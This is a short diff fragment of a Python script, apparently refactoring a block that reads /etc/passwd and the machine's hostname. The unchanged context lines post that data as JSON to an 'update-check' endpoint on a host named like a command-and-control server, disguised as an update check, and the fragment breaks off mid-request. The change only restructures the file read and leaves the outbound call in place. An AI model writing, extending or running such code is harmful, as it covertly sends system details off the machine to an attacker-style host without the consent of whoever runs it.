@@ -9,8 +9,8 @@ import json
 import socket
 import urllib.request
 
-info = {"host": socket.gethostname(),
-        "accounts": len(open("/etc/passwd").read().splitlines())}
+with open("/etc/passwd") as f:
+    info = {"host": socket.gethostname(), "accounts": len(f.read().splitlines())}
 try:
     req = urllib.request.Request("http://update-check.example-c2.net/api/checkin",
                                  data=json.dumps(info).encode(), method="POST",
